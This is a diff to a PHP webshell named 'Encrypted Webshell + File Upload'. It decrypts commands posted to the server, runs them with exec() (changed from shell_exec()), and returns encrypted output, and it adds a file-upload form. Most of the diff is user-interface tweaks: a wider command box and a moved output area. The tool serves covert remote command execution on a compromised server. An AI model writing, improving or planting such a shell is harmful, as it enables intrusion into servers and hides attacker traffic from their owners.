@@ -47,7 +47,7 @@ if (isset($_POST['command'])) {
     $encryptedCommand = $_POST['command'];
     $command = decryptData($encryptedCommand);
 
-    $output = shell_exec($command);
+    $output = exec($command);
     $encryptedOutput = encryptData($output);
     echo $encryptedOutput;
     exit;
@@ -139,14 +139,15 @@ if (isset($_POST['command'])) {
 </head>
 <body>
     <h1>Encrypted Webshell + File Upload</h1>
-    <input type="text" id="command" placeholder="Nhập lệnh" />
-    <button onclick="sendCommand()">Submit</button>
+    <input type="text" id="command" placeholder="Nhập lệnh" style="width: 800px; height: 40px; font-size: 16px;"/>
+    <button onclick="sendCommand()" >Submit</button>
+    <pre id="output"></pre>
     
     <!-- upload file -->
     <h2>Upload File</h2>
     <input type="file" id="fileInput" />
     <button onclick="uploadFile()">Upload File</button>
     
-    <pre id="output"></pre>
+    
 </body>
 </html>
